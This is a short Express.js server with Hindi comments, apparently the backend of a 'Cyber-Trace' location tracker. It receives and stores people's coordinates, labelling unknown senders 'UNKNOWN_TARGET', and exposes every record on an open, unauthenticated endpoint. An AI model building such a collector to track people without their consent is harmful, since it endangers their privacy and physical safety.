const express = require('express');
const cors = require('cors');

const app = express();

// क्लाउड सर्वर अपने हिसाब से पोर्ट देता है, लोकल के लिए 3000 इस्तेमाल होगा
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json()); // JSON डेटा पढ़ने के लिए
app.use(cors());         // क्रॉस-ओरिजिन रिक्वेस्ट की अनुमति देने के लिए

// डेटा को स्टोर करने के लिए अस्थायी एरे (मेमोरी स्टोरेज)
const savedLocations = [];

// 1. टेस्ट करने के लिए रूट राउट
app.get('/', (req, res) => {
  res.send('Cyber-Trace Location Server is running successfully!');
});

// 2. POST Endpoint: फ्रंटएंड से लोकेशन डेटा रिसीव और सेव करेगा
app.post('/api/save-location', (req, res) => {
  const { userId, latitude, longitude, accuracy, timestamp } = req.body;

  // जाँच करें कि कोऑर्डिनेट्स आए हैं या नहीं
  if (!latitude || !longitude) {
    return res.status(400).json({ error: 'Latitude aur Longitude zaroori hain.' });
  }

  // लोकेशन का रिकॉर्ड तैयार करें
  const locationRecord = {
    userId: userId || "UNKNOWN_TARGET",
    latitude,
    longitude,
    accuracy: accuracy || 'N/A',
    timestamp: timestamp || new Date().toISOString(),
    receivedAt: new Date().toISOString()
  };

  // डेटा को एरे में सबसे ऊपर जोड़ें (ताकि नया डेटा पहले दिखे)
  savedLocations.unshift(locationRecord);

  // सर्वर के टर्मिनल/कंसोल में प्रिंट करें
  console.log('--- Nayi Location Prapt Hui ---');
  console.log(locationRecord);

  // क्लाइंट को सक्सेस मैसेज भेजें
  return res.status(200).json({
    message: 'Location server par safaltapoorvak save ho gayi hai!',
    data: locationRecord
  });
});

// 3. GET Endpoint: डैशबोर्ड और New.html के लिए सभी सेव की गई लोकेशन्स फेच करेगा
app.get('/api/view-locations', (req, res) => {
  try {
    return res.status(200).json(savedLocations);
  } catch (error) {
    console.error('Error fetching locations:', error);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
});

// सर्वर को स्टार्ट करें
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
